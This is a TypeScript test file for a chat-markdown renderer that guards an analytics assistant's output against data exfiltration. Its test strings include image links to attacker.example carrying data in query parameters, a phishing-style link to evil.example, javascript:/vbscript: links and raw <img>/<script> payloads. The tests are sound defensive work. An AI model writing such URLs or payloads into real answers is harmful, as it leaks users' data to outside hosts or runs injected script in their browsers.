import {renderToStaticMarkup} from 'react-dom/server';
import {describe, expect, it} from 'vitest';
import {ChatMarkdown, KNOWN_LINK_HOSTS, collapseBr, safeLinkUrl} from '../components/analyst/chat-markdown';

const html = (text: string): string => renderToStaticMarkup(<ChatMarkdown text={text} />);

describe('assistant markdown: no images (exfiltration through a model-written URL)', () => {
  it('renders no <img> for an inline, a reference-style or a linked image', () => {
    for (const md of [
      '![x](https://attacker.example/p.png?d=revenue-12345)',
      '![x][r]\n\n[r]: https://attacker.example/p.png?d=1',
      '[![x](https://attacker.example/p.png?d=1)](https://attacker.example)',
      'Total is ₱1,200. ![](https://attacker.example/pixel.gif?q=1200)',
      '![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)',
    ]) {
      const out = html(md);
      expect(out, md).not.toMatch(/<img/i);
      expect(out, md).not.toContain('attacker.example/p');
      expect(out, md).not.toContain('pixel.gif');
    }
  });

  it('keeps the surrounding text', () => {
    expect(html('Total is ₱1,200. ![](https://attacker.example/pixel.gif?q=1200)')).toContain('Total is ₱1,200.');
  });

  it('raw HTML is not rendered either (no rehype-raw)', () => {
    const out = html('<img src="https://attacker.example/p.png"> <script>alert(1)</script>');
    expect(out).not.toMatch(/<img|<script/i);
  });
});

describe('assistant markdown: links', () => {
  it('an https link opens in a new tab with noopener', () => {
    const out = html('[the docs](https://example.com/a?b=1)');
    expect(out).toContain('href="https://example.com/a?b=1"');
    expect(out).toContain('target="_blank"');
    expect(out).toMatch(/rel="[^"]*noopener[^"]*"/);
  });

  it('javascript:, data:, mailto:, relative and protocol-relative links lose their href', () => {
    for (const md of ['[x](javascript:alert(1))', '[x](JaVaScRiPt:alert(1))', '[x](java\tscript:alert(1))', '[x](data:text/html,<b>)', '[x](mailto:a@b.co)', '[x](/reports)', '[x](//evil.example)', '[x](vbscript:msgbox)']) {
      const out = html(md);
      expect(out, md).not.toMatch(/href=/i);
      expect(out, md).toContain('x');
    }
  });

  it('safeLinkUrl keeps http(s) and drops the rest', () => {
    expect(safeLinkUrl('https://example.com')).toBe('https://example.com');
    expect(safeLinkUrl('http://example.com/x')).toBe('http://example.com/x');
    for (const v of ['javascript:alert(1)', 'mailto:a@b.co', '/relative', '//evil.example', '', 'not a url', 'ftp://x.example', 'data:image/png;base64,AAAA']) {
      expect(safeLinkUrl(v), v).toBe('');
    }
  });

  it('still renders ordinary markdown (bold, list, table)', () => {
    const out = html('**Hi**\n\n- a\n- b\n\n| a | b |\n|---|---|\n| 1 | 2 |');
    expect(out).toContain('<strong>Hi</strong>');
    expect(out).toContain('<li>a</li>');
    expect(out).toContain('<table>');
  });
});

describe('assistant markdown: Explore answers link only to known hosts', () => {
  const known = (text: string): string => renderToStaticMarkup(<ChatMarkdown text={text} knownHostsOnly />);
  it('a link to an unknown host renders as plain text (no anchor, no href)', () => {
    const out = known('See [your prize](https://evil.example/claim?d=1) now');
    expect(out).not.toMatch(/<a /);
    expect(out).not.toContain('evil.example');
    expect(out).toContain('your prize');
  });
  it('lookalike hosts and userinfo tricks are refused', () => {
    for (const u of ['https://shopee.ph.evil.example/x', 'https://evil.example@shopee.ph/x', 'https://notshopee.ph/x', 'http://127.0.0.1/x']) expect(safeLinkUrl(u, KNOWN_LINK_HOSTS), u).toBe('');
  });
  it('no link is clickable (the list is empty), and images are still dropped', () => {
    const out = known('[shop](https://shopee.ph/zoomy)');
    expect(out).not.toMatch(/<a /);
    expect(out).toContain('shop');
    expect(known('![x](https://shopee.ph/p.png)')).not.toMatch(/<img/);
  });
  it('the known host list is pinned empty (adding a host is a reviewed diff)', () => {
    expect([...KNOWN_LINK_HOSTS]).toEqual([]);
  });
  it('without the flag the existing behaviour is unchanged', () => {
    expect(safeLinkUrl('https://example.com/a')).toBe('https://example.com/a');
  });
});

describe('assistant markdown: degenerate <br> runs', () => {
  it('collapses a run of 50 <br> into one line break', () => {
    expect(collapseBr('a' + '<br> '.repeat(50) + 'b')).toBe('a\nb');
    expect(html('a' + '<br> '.repeat(50) + 'b')).not.toMatch(/&lt;br/i);
  });
  it('drops a tool call typed as text (tools off in the wrap-up step)', () => {
    expect(collapseBr('done\n\n<render_chart> </render_chart>\n\nnext')).toBe('done\n\n \n\nnext');
    expect(html('a <render_kpi/> b')).not.toMatch(/render_kpi/);
  });
  it('handles <br/>, <br />, any case', () => {
    expect(collapseBr('a<BR/><Br />\n<br>b')).toBe('a\nb');
  });
  it('leaves normal text and fenced code alone', () => {
    expect(collapseBr('plain **text**')).toBe('plain **text**');
    expect(collapseBr('x<br>y\n```\n<br>\n```\n')).toBe('x\ny\n```\n<br>\n```\n');
  });
});
